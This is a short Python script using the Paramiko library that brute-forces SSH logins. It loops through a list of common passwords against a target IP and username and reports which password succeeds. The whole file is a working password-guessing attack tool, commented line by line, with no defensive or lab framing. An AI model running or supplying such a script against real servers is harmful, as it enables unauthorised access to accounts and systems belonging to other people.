import paramiko  # Import Paramiko library for SSH connections

# Function to attempt SSH login using provided credentials
def ssh_brute_force(ip, username, password_list):
    client = paramiko.SSHClient()  # Create an SSH client instance
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Automatically add host keys from known hosts

    for password in password_list:  # Iterate over each password in the list
        try:
            client.connect(ip, username=username, password=password, timeout=1)  # Attempt to connect to the SSH server
            print(f"Success: Password found - {password}")  # If connection is successful, print the found password
            client.close()  # Close the SSH connection
            break  # Exit the loop as password is found
        except paramiko.AuthenticationException:  # Handle authentication errors
            print(f"Failed: {password}")  # Print the failed password attempt
        except Exception as e:  # Handle other exceptions
            print(f"Connection failed: {e}")  # Print the exception message
        finally:
            client.close()  # Ensure the SSH connection is closed after each attempt

# Example usage
if __name__ == "__main__":
    ip = "192.168.1.100"  # Target IP address
    username = "target_username"  # Target username
    password_list = ["123456", "password", "admin", "letmein"]  # Example list of passwords to try

    ssh_brute_force(ip, username, password_list)  # Call the brute force function
